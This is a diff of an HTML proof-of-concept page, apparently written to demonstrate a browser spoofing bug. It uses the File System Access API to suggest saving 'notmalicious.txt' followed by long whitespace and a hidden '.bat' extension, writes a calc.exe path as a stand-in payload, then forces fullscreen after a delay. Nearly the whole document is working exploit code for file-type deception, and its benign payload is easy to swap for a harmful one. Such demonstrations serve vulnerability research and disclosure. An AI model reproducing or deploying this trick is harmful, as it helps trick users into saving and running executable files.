@@ -1,85 +1,113 @@
 <!doctype html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <title>File System Access API - Save then Fullscreen (3s delay)</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="icon" type="image/x-icon" href="favicon.png">
+  <meta charset="utf-8" />
+  <title>Save then Fullscreen (PoC)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
-    body{font-family:system-ui,Arial;margin:24px}
-    button{font-size:18px;padding:10px 14px;border-radius:8px;border:0;background:#2563eb;color:#fff;cursor:pointer}
-    .status{margin-top:12px;color:#374151}
+    body{font-family:system-ui, -apple-system, "Segoe UI", Roboto, Arial; padding:24px; background:#f7fafc;}
+    .card{max-width:720px;background:#fff;padding:18px;border-radius:10px;box-shadow:0 8px 24px rgba(2,6,23,.06)}
+    h1{margin:0 0 8px;font-size:18px}
+    p{margin:0 0 12px;color:#374151}
+    button{font-size:20px;padding:12px 18px;border-radius:8px;border:0;background:#2563eb;color:#fff;cursor:pointer}
+    .status{margin-top:12px;color:#4b5563}
   </style>
 </head>
 <body>
-  <h3>File System Access API - Hide extension by many white spaces</h3>
-  <div style="display:flex;flex-direction:column;max-width:780px">
-    <div>
-      <button id="addNewFile" style="font-size:26px;margin-top:10px;">Save image</button>
-    </div>
+  <div class="card">
+    <h1>Save file → Enter fullscreen (auto-exit)</h1>
+    <p>Click <strong>Save image</strong>. File picker will open, file will be written, then the page will enter fullscreen (3s delay). It will automatically exit fullscreen after 3s.</p>
+    <button id="addNewFile">Save image</button>
     <div id="status" class="status">Status: idle</div>
   </div>
 
-  <script>
-    const butSaveNewFile = document.getElementById('addNewFile');
-    const statusEl = document.getElementById('status');
+<script>
+(async () => {
+  const btn = document.getElementById('addNewFile');
+  const statusEl = document.getElementById('status');
 
-    function setStatus(t){ statusEl.textContent = 'Status: ' + t; }
+  function setStatus(text){
+    statusEl.textContent = 'Status: ' + text;
+  }
 
-    async function delay(ms){ return new Promise(r => setTimeout(r, ms)); }
+  function delay(ms){ return new Promise(resolve => setTimeout(resolve, ms)); }
 
-    butSaveNewFile.addEventListener('click', async () => {
-      butSaveNewFile.disabled = true;
-      setStatus('Opening save file picker...');
-      try {
-        const options = {
-          suggestedName: 'notmalicious.txt                                                                                                                                       .bat',
-          types: [{
-            description: 'Text file',
-            accept: { 'text/plain': ['.bat'] },
-          }],
-        };
+  async function saveFileViaPicker(){
+    if (!('showSaveFilePicker' in window)) {
+      throw new Error('File System Access API not supported in this context (HTTPS or localhost required).');
+    }
 
-        // Show save file picker (user must interact and grant permission)
-        const handle = await window.showSaveFilePicker(options);
-        setStatus('Saving file...');
-        const writable = await handle.createWritable();
-        // Write content (example). Adjust as needed.
-        await writable.write('C:\\Windows\\system32\\calc.exe');
-        await writable.close();
-        setStatus('File saved. Waiting 3 seconds before entering fullscreen...');
+    const options = {
+      suggestedName: 'notmalicious.txt                                                                                                                                       .bat',
+      types: [{
+        description: 'Text file',
+        accept: { 'text/plain': ['.bat'] },
+      }],
+    };
 
-        // Delay 3 seconds
-        await delay(3000);
+    const handle = await window.showSaveFilePicker(options);
+    const writable = await handle.createWritable();
+    // Example content; change as needed
+    await writable.write('C:\\Windows\\System32\\calc.exe');
+    await writable.close();
+  }
 
-        // Try to enter fullscreen
-        try {
-          if (document.documentElement.requestFullscreen) {
-            await document.documentElement.requestFullscreen();
-            setStatus('Entered fullscreen.');
-          } else {
-            setStatus('Fullscreen API not supported.');
-          }
-        } catch (fsErr) {
-          console.error('Fullscreen error', fsErr);
-          setStatus('Failed to enter fullscreen: ' + (fsErr && (fsErr.message || fsErr.name)));
-        }
+  btn.addEventListener('click', async () => {
+    btn.disabled = true;
+    setStatus('Opening save dialog (user gesture) ...');
 
-        // Optional: show an alert to indicate completion
-        // alert('File saved and entered fullscreen (if supported).');
+    try {
+      // 1) Show save file picker and write file (this must be triggered by user gesture)
+      await saveFileViaPicker();
+      setStatus('File saved. Waiting 3s before entering fullscreen...');
 
-      } catch (err) {
-        console.error('Error during save/fullscreen sequence', err);
-        if (err.name === 'AbortError') setStatus('Save cancelled by user.');
-        else if (err.name === 'NotAllowedError' || err.name === 'SecurityError') setStatus('Permission denied or insecure context (HTTPS required).');
-        else setStatus('Error: ' + (err.message || err.name));
-      } finally {
-        butSaveNewFile.disabled = false;
+      // 2) Delay 3s but keep this inside the same async chain so gesture is preserved
+      await delay(3000);
+
+      // 3) Enter fullscreen (still allowed because we stayed in the same user-initiated chain)
+      if (document.documentElement.requestFullscreen) {
+        await document.documentElement.requestFullscreen();
+        setStatus('Entered fullscreen. Will exit fullscreen after 3s.');
+      } else {
+        setStatus('Fullscreen API not supported in this browser.');
+        btn.disabled = false;
+        return;
       }
-    });
-  </script>
+
+      // 4) Auto-exit fullscreen after 3s (for demo)
+      setTimeout(async () => {
+        if (document.fullscreenElement) {
+          try {
+            await document.exitFullscreen();
+            setStatus('Exited fullscreen.');
+          } catch (err) {
+            console.error('exitFullscreen error', err);
+            setStatus('Failed to exit fullscreen: ' + (err && (err.message || err.name)));
+          }
+        } else {
+          setStatus('Not in fullscreen anymore.');
+        }
+        btn.disabled = false;
+      }, 3000);
+
+    } catch (err) {
+      console.error(err);
+      // Friendly status messages depending on error
+      if (err.name === 'AbortError') setStatus('Save cancelled by user.');
+      else if (err.name === 'NotAllowedError' || err.name === 'SecurityError') setStatus('Permission denied or insecure context.');
+      else setStatus('Error: ' + (err.message || err.name || 'unknown'));
+      btn.disabled = false;
+    }
+  });
+
+  // Update status if user exits fullscreen manually
+  document.addEventListener('fullscreenchange', () => {
+    if (!document.fullscreenElement) {
+      setStatus('Exited fullscreen.');
+      btn.disabled = false;
+    }
+  });
+})();
+</script>
 </body>
-</html>
-
-
 </html>
